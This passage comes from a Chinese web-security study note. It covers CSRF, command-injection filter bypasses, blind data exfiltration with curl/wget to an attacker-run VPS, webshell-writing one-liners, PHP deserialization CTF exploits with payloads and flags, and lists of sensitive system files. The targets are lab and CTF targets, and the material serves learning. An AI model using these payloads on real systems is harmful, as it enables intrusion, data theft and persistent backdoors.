  /root/.ssh/id_ras.keystore
  /root/.ssh/known_hosts
  /etc/passwd
  /etc/shadow
  /etc/my.cnf
  /etc/httpd/conf/httpd.conf
  /root/.bash_history
  /root/.mysql_history
  /proc/self/fd/fd[0-9]*(文件标识符)
  /proc/mounts
  /porc/config.gz
  ```

## CSRF(跨站请求伪造)

​		Cross-site request forgery  简称为“CSRF”，在CSRF的攻击场景中攻击者会伪造一个请求（这个请求一般是一个链接），然后欺骗目标用户进行点击，用户一旦点击了这个请求，整个攻击就完成了。所以CSRF攻击也成为"one click"攻击。

### 靶场演示

**pikachu靶场**：**CSRF-Get**、**CSRF-Post**、**CSRF-Token**

用burpsuite抓登录包

<img src="PictureFile/【Web】TOP漏洞.assets/image-20231025200628348.png" alt="image-20231025200628348" style="zoom: 67%;" />

数据包内容如下：

```
GET /pikachu/vul/csrf/csrfget/csrf_get_login.php?username=vince&password=123456&submit=Login HTTP/1.1
Host: 192.168.229.131
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://192.168.229.131/pikachu/vul/csrf/csrfget/csrf_get_login.php
Cookie: PHPSESSID=ab3u33vohoh383aj1e9ja3ukff
Upgrade-Insecure-Requests: 1
```

用burp生成csrf Poc：

```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="http://192.168.229.131/pikachu/vul/csrf/csrfget/csrf_get_login.php">
      <input type="hidden" name="username" value="vince" />
      <input type="hidden" name="password" value="123456" />
      <input type="hidden" name="submit" value="Login" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```

用**同一个浏览器**运行Poc：

![image-20231025200929158](PictureFile/【Web】TOP漏洞.assets/image-20231025200929158.png)

点击按钮后发现登录成功：

<img src="PictureFile/【Web】TOP漏洞.assets/image-20231025200959246.png" alt="image-20231025200959246" style="zoom: 67%;" />

## RCE(远程代码执行)

RCE又称远程代码执行漏洞，可以让攻击者直接向后台服务器远程注入操作系统命令或者代码，从而控制后台系统。服务器没有对执行命令的函数做严格的过滤，最终导致命令被执行。

### 系统命令执行函数

```javascript
PHP代码执行函数：
eval()、assert()、preg_replace()、create_function()、array_map()、call_user_func()、call_user_func_array()、array_filter()、uasort()、等
PHP命令执行函数：
system()、exec()、shell_exec()、pcntl_exec()、popen()、proc_popen()、passthru()、等
```

### 绕过方法

#### 1.过滤关键字

**替代法**

```text
more:一页一页的显示档案内容
less:与 more 类似
head:查看头几行
tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示
tail:查看尾几行
nl：显示的时候，顺便输出行号
od:以二进制的方式读取档案内容
vi:一种编辑器，这个也可以查看
vim:一种编辑器，这个也可以查看
sort:可以查看
uniq:可以查看
rev:倒过来看
file -f:报错出具体内容
bash -v:报错出具体内容
sh /flag 2>%261 //报错出文件内容
```

**使用特殊符号**

单引号：单引号所见即所得，直接显示单引号里的内容。即单引号里的任何字符都会原样输出，单引号字符串中的变量是无效的。

双引号：先把变量解析之后，再输出。上面的例子中，使用双引号的时候，所见非所得，系统会先计算 $TEST 的值，然后再 echo 出来。

反引号：用于命令替换，即先执行反引号中的语句，再把结果加入到原命令中。

PS：只要引号、双引号闭合就可以运行,反引号除外

```text
单引号：
c''at flag.txt
c'a't 'f'lag.txt
反引号：
c``at flag.txt
``c``a``t ``flag.txt
反斜杠：
ca\t flag.txt
\c\a\t \f\lag.txt
双引号：
c""at flag.txt
"c"at f""lag.txt
```

**拼接法**

```text
a=fl;b=ag;cat$IFS$a$b
```

**空变量绕过**

ps:所有shell未定义的变量均为空变量:

```
$*和$@,$x,${x},$ddd,$LOVE
```

```
ca${x}t fl*
ca${LOVE}t fl*
c${x}a${LOVE}t f${666}l*
```

**编码绕过**

```
`echo 'Y2F0Cg==' | base64 -d` flag.txt
```

**正则表达式绕过**

```
cat f*
cat ??a*
```

#### 2.绕过命令执行函数

**编码绕过**

![img](PictureFile/【Web】TOP漏洞.assets/v2-010549dea37a2f1827ccfe654fb04617_720w.webp)

**内敛执行绕过**

```text
echo `ls`;
echo $(ls);
?><?=`ls`;
?><?=$(ls);
```

#### 3.绕过读取文件的命令

**绕过方法**

```text
[root@kali flag123]# curl file:///flag123/flag
  flag{suifeng}
  [root@kali flag123]# strings flag 
  flag{suifeng}
  [root@kali flag123]# uniq -c flag
        1 flag{suifeng}
  [root@kali flag123]# bash -v flag
  flag{suifeng}
  flag: line 1: flag{suifeng}: command not found
  [root@kali flag123]# rev flag
  }gnefius{galf
  [root@kali flag123]#
```

find -- 列出当前目录下的文件以及子目录所有文件



![img](PictureFile/【Web】TOP漏洞.assets/v2-e8b6aecb76e6ddd4ba2c62a1cf725c52_720w.webp)

#### 4.绕过空格

```text
%09（url传递）(cat%09flag.php)
${IFS}
$IFS$9
<>（cat<>/flag）
<（cat</flag）
{cat,flag}
```

#### 5.过滤目录分割

```text
采用多管道命令绕过
127.0.0.1||cd flag_is_here;cat flag_262431433226364.php
```

![img](PictureFile/【Web】TOP漏洞.assets/v2-9d2fbc6a8bf15feb9ddc381cfdecd2f3_720w.webp)

#### 6.过滤分割符 | & ；

```text
  ;  //分号
  |  //只执行后面那条命令
  ||  //只执行前面那条命令
  &  //两条命令都会执行
  &&  //两条命令都会执行
  %0a      //换行符
  %0d     //回车符号
  
  用?>代替；
  在php中可以用?>来代替最后的一个；，因为php遇到定界符关闭标签会自动在末尾加上一个分号。
```

#### 7.过滤括号

#### 8.输入字符串长度限制

![img](PictureFile/【Web】TOP漏洞.assets/v2-98bb5ff33a85f7c730ee2bc828a40a34_720w.webp)

```text
#  \指的是换行
  #  ls -t是将文本按时间排序输出
  #  ls -t >shell  将输出输入到shell文件中
  #  sh将文本中的文字读取出来执行
```

#### 9.利用$PATH环境变量绕过

利用环境变量来截取字母达到绕过过滤

![img](PictureFile/【Web】TOP漏洞.assets/v2-f65b87f77023dc290102e89b4203ca1a_720w.webp)

假如数字被过滤，我们还可以利用环境变量的长度来进一步绕过过滤

```text
for i in `env`; do echo -n "${i%=*} lenth is
";echo ${i#*=}|awk '{print length($0)}'; done |grep 5 
```

![img](PictureFile/【Web】TOP漏洞.assets/v2-8b7cef28020af52f24ed8f3f7f8a6228_720w.webp)





![img](PictureFile/【Web】TOP漏洞.assets/v2-65410c0ccf090cb4b8bba2841fe43946_720w.png)



#### 10.无回显

**一、Shell_exec等无回显函数**

**方法一、**

1、判断是否执行成功我们可以用sleep()

eg：ls;sleep(5);

2、用压缩、复制、写shell等方法对其进行绕过（此处要注意权限，看是否有写的权限）

```text
copy flag 1.txt
  mv flag 1.txt
  cat flag > 1.txt
  tar zcvf flag.tar.gz flag
  echo 3c3f706870206576616c28245f504f53545b3132335d293b203f3e|xxd -r -ps > webshell.php
  echo "<?php @eval($_POST['suifeng']); ?>" > webshell.php
```

利用上述操作产生新的文件，然后我们在对新的文件进行访问



![img](PictureFile/【Web】TOP漏洞.assets/v2-b5b91c2cc14fae914b3f573372f64e33_720w.png)

![img](PictureFile/【Web】TOP漏洞.assets/v2-ead1d94fc19457b542e8ccf9c1cf5dea_720w.webp)

![img](PictureFile/【Web】TOP漏洞.assets/v2-d64848931638b00f35bd1b03a069b3c7_720w.webp)

![img](PictureFile/【Web】TOP漏洞.assets/v2-d64848931638b00f35bd1b03a069b3c7_720w.webp)

**方法二、**

用vps建立记录脚本

**1、首先在自己的公网ip的网站目录下建立一个record.php的文件，里面写下如下代码**

```text
<?php
    $data =$_GET['data'];
    $f = fopen("flag.txt", "w");
    fwrite($f,$data);
    fclose($f);
    ?>
```

2、第二步我们开始构造请求

```text
  curl http://*.*.*.**/record.php?data=`cat flag`
  wget http://*.*.*.*/record.php?data=`cat flag`
```

**测试**

**这里是上帝视角（为了师傅们更直观理解）**

首先看目标网站上的文件

![img](PictureFile/【Web】TOP漏洞.assets/v2-49b00714ae15673487e16b6b8f4c2c2f_720w.webp)

接下来看自己服务器上的文件

![img](PictureFile/【Web】TOP漏洞.assets/v2-baab02f5159dda6e65d60e1f39297efc_720w.webp)

我们在目标站点执行如下命令

![img](PictureFile/【Web】TOP漏洞.assets/v2-b400eb43fbb4f49b43bef861efcf4eff_720w.webp)

这样我们在自己的服务器上就会产生一个flag.txt文件,然后进行查看

![img](PictureFile/【Web】TOP漏洞.assets/v2-ee53b77df721a1b6e7f9c98169cea36e_720w.webp)

有时会读取不全，这里我没碰到，读取不全的话我们可以进行一个编码，如下。

```text
curlhttp://*.*.*.**/record.php?data=`catflag|base64`
wgethttp://*.*.*.*/record.php?data=`catflag|base64`
```

更多参考[https://blog.csdn.net/qq_43625917/article/details/107873787](https://link.zhihu.com/?target=https%3A//blog.csdn.net/qq_43625917/article/details/107873787)

**二、>/dev/null 2>&1类无回显**

代码中插入了>/dev/null 2>&1，“>/dev/null 2>&1”的作用就是不回显。

![img](PictureFile/【Web】TOP漏洞.assets/v2-c332969cc627dcefffcf239469b4ac48_720w.webp)

该种无回显我们用分隔符进行分割即可绕过

![img](PictureFile/【Web】TOP漏洞.assets/v2-c90eb4a4a6bc153db78918c782952814_720w.webp)

## 反序列化

### 概念

反序列化漏洞是基于序列化和反序列化的操作，在反序列化——unserialize()时存在用户可控参数，而反序列化会自动调用一些魔术方法，如果魔术方法内存在一些敏感操作例如eval()函数，而且参数是通过反序列化产生的，那么用户就可以通过改变参数来执行敏感操作，这就是反序列化漏洞。

序列化：把对象转换为字节序列的过程称为对象的序列化。 

反序列化：把字节序列恢复为对象的过程称为对象的反序列化。

```php
__construct() 当创建对象时触发，一般用于初始化对象，对变量赋初值
__sleep() 使用serialize()时自动触发 
__wakeup() 使用unserialize()时自动触发
__destruct() 当一个对象被销毁时触发
__toString() 当一个类被当成字符串使用时触发
__invoke() 当尝试以调用函数的方式调用一个对象时触发
__call() 在对象上下文中调用不可访问的方法时触发 
__callStatic() 在静态上下文中调用不可访问的方法时触发 
__get() 用于从不可访问的属性读取数据
__set() 用于将数据写入不可访问的属性
__isset() 在不可访问的属性上调用isset()或empty()触发
__unset() 在不可访问的属性上使用unset()时触发
```

### 例子

#### [SWPUCTF 2021 新生赛]ez_unserialize

https://www.nssctf.cn/problem/426

```php
<?php

error_reporting(0);
show_source("cl45s.php");

class wllm
{

    public $admin;
    public $passwd;

    public function __construct()
    {
        $this->admin = "user";
        $this->passwd = "123456";
    }

    public function __destruct()
    {
        if ($this->admin === "admin" && $this->passwd === "ctf") {
            include("flag.php");
            echo $flag;
        } else {
            echo $this->admin;
            echo $this->passwd;
            echo "Just a bit more!";
        }
    }
}

$p = $_GET['p'];
unserialize($p);
?>
```

payload:

```
p=O:4:"wllm":2:{s:5:"admin";s:5:"admin";s:6:"passwd";s:3:"ctf";}
```

exp

```php
<?php

class wllm
{
    public $admin = "admin";
    public $passwd = "ctf";
}

echo serialize(new wllm());
```

#### [SWPUCTF 2021 新生赛]pop

https://www.nssctf.cn/problem/440

题目

```php
<?php

error_reporting(0);
show_source("index.php");

class w44m
{

    private $admin = 'aaa';
    protected $passwd = '123456';

    public function Getflag()
    {
        if ($this->admin === 'w44m' && $this->passwd === '08067') {
            include('flag.php');
            echo $flag;
        } else {
            echo $this->admin;
            echo $this->passwd;
            echo 'nono';
        }
    }
}

class w22m
{
    public $w00m;

    public function __destruct()
    {
        echo $this->w00m;
    }
}

class w33m
{
    public $w00m;
    public $w22m;

    public function __toString()
    {
        $this->w00m->{$this->w22m}();
        return 0;
    }
}

$w00m = $_GET['w00m'];
unserialize($w00m);

?> 
```

exp

```php
<?php

class w44m
{
    private $admin = 'w44m';
    protected $passwd = '08067';//要和题目中的对应;否则是一个新的对象flag出不来
}

class w22m
{
    public $w00m;
}

class w33m
{
    public $w00m;
    public $w22m;
}

$a = new w22m;
$a->w00m = new w33m;
$a->w00m->w00m = new w44m;
$a->w00m->w22m = "Getflag";
echo urlencode(serialize($a));
```

flag

```
NSSCTF{eb431e94-6eeb-4948-8306-37b345edc41b}
```

#### [SWPUCTF 2022 新生赛]1z_unserialize

rce、简单反序列化

https://www.nssctf.cn/problem/2883

题目

```php
<?php

class lyh
{
    public $url = 'NSSCTF.com';
    public $lt;
    public $lly;

    function __destruct()
    {
        $a = $this->lt;

        $a($this->lly);
    }


}

unserialize($_POST['nss']);
highlight_file(__FILE__);
?> 
```

pyload

```
nss=O:3:"lyh":2:{s:2:"lt";s:6:"system";s:3:"lly";s:7:"cat /f*";}
```

flag

```
NSSCTF{34699c15-53cd-4e22-b1d9-dec8fc5aa519}
```

#### [SWPUCTF 2023 秋季新生赛]UnS3rialize

https://www.nssctf.cn/problem/4500

**题目**

```php
<?php
highlight_file(__FILE__);
error_reporting(0);

class NSS
{
    public $cmd;

    function __invoke()
    {
        echo "Congratulations!!!You have learned to construct a POP chain<br/>";
        system($this->cmd);
    }

    function __wakeup()
    {
        echo "W4keup!!!<br/>";
        $this->cmd = "echo Welcome to NSSCTF";
    }
}


class C
{
    public $whoami;

    function __get($argv)
    {
        echo "what do you want?";
        $want = $this->whoami;
        return $want();
    }
}

class T
{
    public $sth;

    function __toString()
    {
        echo "Now you know how to use __toString<br/>There is more than one way to trigger";
        return $this->sth->var;
    }
}

class F
{
    public $user = "nss";
    public $passwd = "ctf";
    public $notes;

    function __construct($user, $passwd)
    {
        $this->user = $user;
        $this->passwd = $passwd;
    }

    function __destruct()
    {
        if ($this->user === "SWPU" && $this->passwd === "NSS") {
            echo "Now you know how to use __construct<br/>";
            echo "your notes" . $this->notes;
        } else {
            die("N0!");
        }
    }
}


if (isset($_GET['ser'])) {
    $ser = unserialize(base64_decode($_GET['ser']));
} else {
    echo "Let's do some deserialization :)";
}
```

**exp**

```php
<?php

class NSS
{
    public $cmd;

}


class C
{
    public $whoami;

}

class T
{
    public $sth;

}

class F
{
    public $user = "SWPU";
    public $passwd = "NSS";
    public $notes;

}

$a = new F();
$a->notes = new T();
$a->notes->sth = new C();
$a->notes->sth->whoami = new NSS();
$a->notes->sth->whoami->cmd = "cat /f*";

echo serialize($a);
```
**cve-2016-7124**

```
__wakeup函数绕过
影响范围：

- PHP5 < 5.6.25
- PHP7 < 7.0.10

正常来说在反序列化过程中，会先调用wakeup()方法再进行unserilize()，但如果序列化字符串中表示对象属性个数的值大于真实的属性个数时，wakeup()的执行会被跳过。
```

**flag**

```
NSSCTF{dea9d35e-edbd-48ee-8daf-7227d0b4fb08}
```

## 越权漏洞

**横向越权**：攻击者尝试访问与他拥有相同权限的用户的资源

示例：购物系统中A用户可以可以查询到B用户的订单信息。

**纵向越权**：攻击者可以使用低权限的账户去使用高权限账户的功能。

示例：原本没有删除功能的用户A可以使用管理员用户的删除功能删除了管理员用户中的数据。
